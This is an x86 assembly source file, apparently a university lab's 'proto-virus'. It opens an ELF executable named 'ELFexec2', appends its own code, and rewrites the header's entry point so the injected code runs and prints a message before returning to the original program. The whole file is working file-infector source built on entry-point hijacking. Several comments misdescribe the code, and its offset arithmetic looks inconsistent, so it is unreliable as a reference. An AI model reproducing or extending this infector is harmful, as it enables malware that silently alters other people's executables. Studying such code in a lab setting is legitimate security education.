%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define ELFHDR_size 52
%define ELFHDR_phoff	28
%define STDOUT 1
%define FD [ebp-4]
%define buffer [ebp-8]
%define FileSize [ebp-12]
%define virus_size [ebp-14]
%define header_buffer [ebp-18]

	global _start

	section .text
_start:
	push	ebp
	mov	    ebp, esp
	sub	    esp, STK_RES                ; Set up ebp and reserve space on the stack for local storage
	;CODE START
	open    FileName, RDWR, 0777        ; open file
    mov     edi, eax

    read    edi, ebp, 4                 ; read the magic number (first 4 bytes, ".ELF")
    cmp     dword[ebp], 0x464c457f      ; compare magic number
    jne     not_ELF                     ; if not ELF, jump to close
    
    lseek   edi, 0x18, SEEK_SET         ; go to end of file
    read    edi, previous_entry_point, 4
    
    lseek   edi, 0, SEEK_END
    mov     esi, eax
    write   edi, virus_start, virus_end-virus_start               ; write to virus to the infected file

    lseek   edi, 0x3C, SEEK_SET            ; go to start of file
    read    edi, ebp, 4                 ; read header of the infected file
    add     esi, dword[ebp]
    mov     dword[new_entry_point], esi   ; move to the entry point of the infected file - _start

    lseek   edi, 0x18, SEEK_SET            ; go to end of file
    write   edi, new_entry_point, 4                 ; change PreviousEntryPoint to point to the original entry point
    write   STDOUT, OutStr, 31

    lseek   edi, -4, SEEK_END            ; get start of the file
    write   edi, previous_entry_point, 4               ; write fixed header to file
    jmp     VirusExit

    not_ELF:
    close   edi                             ;close file

VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)

virus_start:
    call    get_my_loc
    sub     ecx, next_i - OutStr
    write   STDOUT, ecx, 31             ; print the virus

    call    get_my_loc
    sub     ecx, next_i - PreviousEntryPoint
    jmp     [ecx]

    FileName:	db "ELFexec2", 0
    OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
    Failstr:    db "perhaps not", 10 , 0


get_my_loc:
	call next_i
next_i:
	pop ecx
	ret
PreviousEntryPoint: dd VirusExit
virus_end:

section .bss
var: resd 1
previous_entry_point: resd 1
new_entry_point: resd 1